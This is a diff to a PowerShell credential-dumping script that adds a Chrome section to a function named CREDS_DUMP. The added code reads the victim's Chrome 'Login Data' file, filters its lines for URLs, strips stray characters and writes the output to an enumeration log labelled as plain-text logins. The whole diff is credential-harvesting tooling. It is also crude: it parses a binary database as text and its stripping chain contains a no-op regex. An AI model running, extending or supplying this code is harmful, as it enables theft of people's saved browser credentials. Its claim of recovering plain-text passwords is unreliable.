@@ -461,7 +461,25 @@ function CREDS_DUMP {
         $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
     }
 
-    ## TODO: Retrieve Chrome Credentials
+    ## TODO: Retrieve Chrome Credentials (plain text)
+    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
+    echo "`nEnumerating LogIn Data Stored Logins (plain text)" >> $LogFilePath\BrowserEnum.log
+    echo "-------------------------------------------------" >> $LogFilePath\BrowserEnum.log
+    If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
+        echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
+    }else{
+        $Json = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|select-string "http"
+        If(-not($Json) -or $Json -eq $null){
+            echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            $ParsingData1 = $Json -replace '♫','' -replace '☺','' -replace '►','' -replace '§','' -replace '↨','' -replace '♥','' -replace '♦',''
+            $ParsingData2 = $ParsingData1 -replace '♣','' -replace '♠','' -replace '¥','' -replace 'ž','' -replace '☻','' -replace '¹','' -replace '↓',''
+            $ParsingData3 = $ParsingData2 -replace '▼','' -replace '☼','' -replace '¶','' -replace '◄','' -replace '⌂','' -replace 'ô','' -replace '‡',''
+            $ParsingData4 = $ParsingData3 -replace '$','' -replace '€','' -replace '£','' -replace '½','' -replace 'ÿ','' -replace 'Æ','' -replace 'Ï',''
+            $ParsedData = $ParsingData4 -replace '¢','' -replace 'Œ','' -replace '¤','' -replace '¿','' -replace '®','' -replace 'æ','' -replace 'š','' -replace '      ',''
+            echo "$ParsedData" >> $LogFilePath\BrowserEnum.log
+        }
+    }
 }
 
 
